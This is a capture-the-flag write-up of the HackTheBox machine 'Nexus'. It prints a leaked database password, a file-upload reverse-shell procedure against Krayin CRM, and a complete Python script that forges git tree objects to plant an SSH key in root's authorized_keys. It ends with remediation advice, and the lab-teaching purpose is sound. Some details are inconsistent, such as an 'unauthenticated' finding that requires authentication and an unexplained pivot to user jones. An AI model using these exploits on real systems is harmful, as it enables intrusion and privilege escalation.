## Executive Summary

Nexus is a Linux machine on HackTheBox rated Medium difficulty. The attack path chains together three realistic, compounding weaknesses commonly found in real-world environments: exposed Git history leaking credentials, password reuse across application layers, an authenticated remote code execution vulnerability in a known CRM product (CVE-2026-38526), and a privilege escalation path via a path traversal vulnerability in a custom root-level systemd service that syncs Gitea template repositories without sanitizing file paths.

## Reconnaissance

### Port Scan

Initial enumeration with nmap identified two open TCP ports:

```bash
nmap -sV -sC 10.129.107.195
```

![nmap scan results](assets/img/posts/nexus/nmapscan.png)

| Port | Service | Version |
|---|---|---|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu |
| 80/tcp | HTTP | nginx 1.24.0 (Ubuntu) |

The HTTP service immediately redirected to `http://nexus.htb/`, indicating nginx is configured for name-based virtual hosting — multiple distinct websites behind a single IP, distinguished only by the `Host` header. The `/etc/hosts` file on the attack machine was updated accordingly:

```
10.129.107.195   nexus.htb git.nexus.htb billing.nexus.htb
```

### Virtual Host Enumeration

Directory fuzzing against the root path turned up nothing of interest (only `index.html`). Rather than burning time with larger wordlists against the same surface, vhost fuzzing was performed to check for additional subdomains:

```bash
gobuster vhost \
  -u http://nexus.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain
```

![gobuster vhost enumeration results](assets/img/posts/nexus/gobusterenum.png)

Two subdomains were discovered:

| Subdomain | Response | Notes |
|---|---|---|
| `git.nexus.htb` | 200 | Gitea self-hosted git server |
| `billing.nexus.htb` | 302 → `/admin/login` | Krayin CRM admin panel |

### Git History Credential Leak

Browsing to `git.nexus.htb` revealed a Gitea instance with a public repository owned by the admin account. The current version of the repository's `.env` file had the database password redacted, but browsing the **commit history** revealed a previous commit where the full `.env` was committed in plaintext before the sensitive values were removed.

![git repository with exposed history](assets/img/posts/nexus/gitnexushtb.png)

Key values recovered from the historical commit:

```
DB_USERNAME=krayin
DB_PASSWORD=N27xh!!2ucY04
```

The `docker-compose.yml` in the same repository also revealed the application architecture: a Krayin CRM container, a MySQL container, and a phpMyAdmin container — though the phpMyAdmin service was not exposed on the live box.

> **Lesson:** Removing a secret from the latest commit does not remove it from git history. The only safe remediation is to rotate the credential immediately and either rewrite history (via `git filter-branch` or `git filter-repo`) or treat the entire repository as compromised. This is why automated secret scanning on pre-commit hooks and in CI/CD pipelines matters — secrets should never reach a commit in the first place.

The main `nexus.htb` site contained a hiring/jobs page. An email address belonging to the hiring manager was visible there:

## Technical Findings & Exploitation

### Finding 1 — Krayin CRM Admin Access via Password Reuse

| Detail | Value |
|---|---|
| URL | `http://billing.nexus.htb/admin/login` |
| Vulnerability | Password reuse (DB password → CRM admin login) |
| Severity | Critical |

![Krayin CRM billing login page](assets/img/posts/nexus/billingnexushtb.png)

The leaked database password from git history was tested against the Krayin CRM admin login using the discovered email address. Authentication succeeded — a direct consequence of password reuse between the database layer and the application layer.

![Krayin CRM dashboard after login](assets/img/posts/nexus/dashboard.png)

### Finding 2 — Unauthenticated File Upload RCE (CVE-2026-38526)

| Detail | Value |
|---|---|
| Product | Krayin CRM 2.2.0 |
| CVE | CVE-2026-38526 |
| Endpoint | `POST /admin/tinymce/upload` |
| Impact | Remote code execution as `www-data` |
| Auth required | Yes (CRM admin session) |

Krayin CRM 2.2.0 contains an arbitrary file upload vulnerability in its TinyMCE rich text editor image upload endpoint. The endpoint accepts file uploads and stores them in the web-accessible `/storage/tinymce/` directory, but performs no meaningful validation of the uploaded file's content or extension — it trusts the `Content-Type` header supplied by the client entirely.

**Exploitation steps:**

1. Navigate to any rich text editor within the CRM (e.g., email compose view) and use the image-insert toolbar button to trigger a real upload request.
2. Capture the `POST /admin/tinymce/upload` request in Burp Suite and send it to Repeater.

![Burp Suite Repeater showing the tinymce upload request](assets/img/posts/nexus/burpesuiterepeater.png)

3. In Repeater, replace the file content with the pentestmonkey PHP reverse shell (`/usr/share/webshells/php/php-reverse-shell.php` on Kali, edited with the correct `tun0` IP and port), set the filename to end in `.php`, and retain `Content-Type: image/png` as the spoofed content type.

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ~/shell.php
# Edit $ip and $port in shell.php, then verify:
php -l ~/shell.php
```

4. Send the modified request. The JSON response contains the stored file's URL:

![Burp Suite POST request and JSON response with file location](assets/img/posts/nexus/burpsuitepostrequest.png)

```json
{
  "location": "http://billing.nexus.htb/storage/tinymce/<hash>.php"
}
```

5. Start a netcat listener, then visit the returned URL to trigger PHP execution:

```bash
nc -lvnp 4444
```

![reverse shell landing on the listener](assets/img/posts/nexus/reverseshelldone.png)

A reverse shell connected as `www-data`.

## Privilege Escalation

### Discovery — Gitea Template Sync Service Running as Root

Standard privesc checks were performed as `jones`:

- `sudo -l` → no sudo rights
- SUID binary scan → only standard expected system binaries, nothing custom

Checking systemd timers revealed a non-standard scheduled job:

```bash
systemctl list-timers
```

```
NEXT                         LEFT    UNIT                          ACTIVATES
...                          1min    gitea-template-sync.timer     gitea-template-sync.service
```

Inspecting the service:

```bash
systemctl cat gitea-template-sync.service
```

```ini
[Unit]
Description=Sync Gitea templates
After=network-online.target

[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
TimeoutStartSec=50s
```

The service runs `/etc/gitea/template-sync.py` **as root**, triggered once per minute.

### Vulnerability — Path Traversal in template-sync.py

Reading the script revealed the vulnerability:

```python
for mode, objhash, filepath in entries:
    target = os.path.join(stage_path, filepath)
    ...
    with open(target, 'wb') as f:
        f.write(cat_result.stdout)
    if mode == '100755':
        os.chmod(target, 0o755)
```

`filepath` comes directly from `git ls-tree` output (i.e., from filenames recorded in a git repository's tree objects) and is passed to `os.path.join()` without any sanitization. Python's `os.path.join()` resolves `..` components faithfully, meaning a filename like `../../../../../root/.ssh/authorized_keys` in a git tree will resolve to `/root/.ssh/authorized_keys` when joined with the staging base path.

The staging directory is:
```
/home/git/template-staging/<owner>/<repo>/
```

That's 5 directory levels deep from `/`, so exactly 5 `..` components are needed to traverse back to root:

```
/home/git/template-staging/jones/pathtraversal/../../../../../root/.ssh/authorized_keys
→ /root/.ssh/authorized_keys
```

The script also only runs on repos marked as **Gitea template repositories** — a real Gitea feature where repos are flagged for use as project starters.

### Exploitation — SSH Key Injection via Malicious Template Repo

**Step 1:** Generate an SSH keypair on the attack machine:

```bash
ssh-keygen -t ed25519 -f ~/.ssh/nexus_root -N ""
cat ~/.ssh/nexus_root.pub
```

**Step 2:** Log into `git.nexus.htb` as `jones` (same password reuse). Create a new repository named `pathtraversal` and mark it as a **Template Repository** in its settings.

**Step 3:** Git's client-side safety checks prevent creating tree entries with `..` in the path via normal commands. The objects must be injected directly into git's object database using a Python script that constructs raw tree objects, bypassing the CLI layer entirely:

```python
#!/usr/bin/env python3
import hashlib, zlib, os, subprocess, sys, time

def write_obj(data, t):
    h = ("%s %d" % (t, len(data))).encode() + b"\x00"
    s = h + data
    sha = hashlib.sha1(s).hexdigest()
    d = os.path.join(".git", "objects", sha[:2])
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, sha[2:])
    if not os.path.exists(p):
        open(p, "wb").write(zlib.compress(s))
    return sha

def entry(mode, name, sha):
    return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)

if not os.path.isdir(".git"):
    print("Run inside git repo"); sys.exit(1)

r = subprocess.run(["cat", "/tmp/.k.pub"], capture_output=True, text=True)
if r.returncode != 0:
    print("Place public key at /tmp/.k.pub"); sys.exit(1)

key = r.stdout.strip() + "\n"
blob = write_obj(key.encode(), "blob")
readme = write_obj(b"# Template\n", "blob")

ssh_t = write_obj(entry("100644", "authorized_keys", blob), "tree")
cur   = write_obj(entry("40000", ".ssh", ssh_t), "tree")
fir   = write_obj(entry("40000", "root", cur), "tree")

for i in range(4):
    fir = write_obj(entry("40000", "..", fir), "tree")

root = write_obj(
    entry("100644", "README.md", readme) + entry("40000", "..", fir),
    "tree"
)

ts = int(time.time())
c = "tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n" % (root, ts, ts)
sha = write_obj(c.encode(), "commit")

os.makedirs(os.path.join(".git", "refs", "heads"), exist_ok=True)
open(os.path.join(".git", "refs", "heads", "main"), "w").write(sha + "\n")
print("Done: " + sha)
```

This script builds a chain of nested git tree objects — a tree named `..` inside a tree named `..` (four levels deep) containing `root/.ssh/authorized_keys` — which git stores internally without complaint, even though the CLI rejects such paths at the surface level.

```bash
cp ~/.ssh/nexus_root.pub /tmp/.k.pub
mkdir -p ~/Documents/HTB/Nexus/nexus-template
cd ~/Documents/HTB/Nexus/nexus-template
git init
git config user.email "jones@nexus.htb"
git config user.name "jones"
python3 build2.py
git remote add origin http://git.nexus.htb/jones/pathtraversal.git
git push -u origin main --force
```

![proof of directory traversal in repo](assets/img/posts/nexus/proofofdirectoryinrepo.png)

## Lessons Learned

**1. Git history is permanent unless explicitly rewritten.**
Removing a secret in a new commit leaves it fully accessible in prior commits. Anyone with read access to the repository — including anonymous users on a public or misconfigured Gitea instance — can recover it with a single `git log -p`. The only safe fix is immediate credential rotation combined with history rewriting using tools like `git filter-repo`, followed by a force-push. Better still: use pre-commit hooks or CI-integrated secret scanners (truffleHog, gitleaks) to prevent secrets reaching commits at all.

**2. Password reuse amplifies every credential leak.**
A single leaked `.env` database password cascaded into CRM admin access, then into system user access (`jones`), because the same password was reused at every layer. Each reuse multiplied the blast radius of the original exposure. Distinct credentials per service, managed via a secrets manager, would have contained the breach to the database layer alone.

**3. Version-identified open source software should be researched for CVEs before any manual fuzzing.**
Once Krayin CRM 2.2.0 was identified, a CVE search immediately surfaced the exact vulnerable endpoint and exploit mechanism. This is faster, more reliable, and less destructive than blind fuzzing — and reflects real attacker behavior. Always check NVD, exploit-db, and GitHub advisories when a product version is known.

**4. `os.path.join()` does not sanitize path components.**
In Python (and most languages), joining a base path with a user-controlled component containing `..` does not keep you inside the base directory — it faithfully resolves the traversal. Any code that writes to the filesystem using paths sourced from untrusted input (git tree entries, user uploads, config files) must explicitly validate that the resolved path stays within the intended directory, typically using `os.path.realpath()` and checking that the result starts with the expected base path.

**5. Systemd timers are a privesc surface often overlooked in favor of crontab.**
Modern Linux systems increasingly use systemd timers instead of cron for scheduled jobs. Enumeration should always include `systemctl list-timers` alongside the traditional `cat /etc/crontab` and `ls /etc/cron.*` checks.

**6. Git's internal object model allows paths that its CLI rejects.**
Git's client-side tooling applies safety checks (rejecting `..` in tree entry paths) that operate at the CLI layer, not at the object storage layer. Raw git objects containing traversal paths can be constructed by writing directly to `.git/objects/`, bypassing these checks entirely. Any server-side code that processes git tree entries as filesystem paths must treat those paths as fully untrusted and validate them independently of git's own client-side protections.

## Recommendations

| Finding | Remediation |
|---|---|
| Exposed `.git` on `git.nexus.htb` with commit history leaking secrets | Rotate all credentials found in history. Rewrite history with `git filter-repo`. Enforce secret scanning in CI. |
| Password reuse across DB / CRM / system accounts | Use unique credentials per service. Store secrets in a vault (Vault, AWS Secrets Manager, etc.). |
| CVE-2026-38526 — Krayin CRM 2.2.0 TinyMCE file upload | Update Krayin CRM to a patched version. Independently validate uploaded file content (magic bytes, not Content-Type). Store uploads outside the webroot, or serve them through a proxy that forces download disposition. |
| `template-sync.py` path traversal | Validate all paths extracted from git tree entries using `os.path.realpath()` and confirm the result is within the intended staging directory before writing. Example: `assert resolved.startswith(os.path.realpath(stage_path) + os.sep)`. |
| Root-owned timer executing a script writable-adjacent to a less-privileged user | Ensure scripts executed as root are owned by root, stored in directories not writable by lower-privileged users, and audited regularly. |
| `APP_DEBUG=true` in live Krayin `.env` | Disable debug mode in production. Laravel debug mode exposes stack traces, environment variables, and internal paths to any user who can trigger an error. |
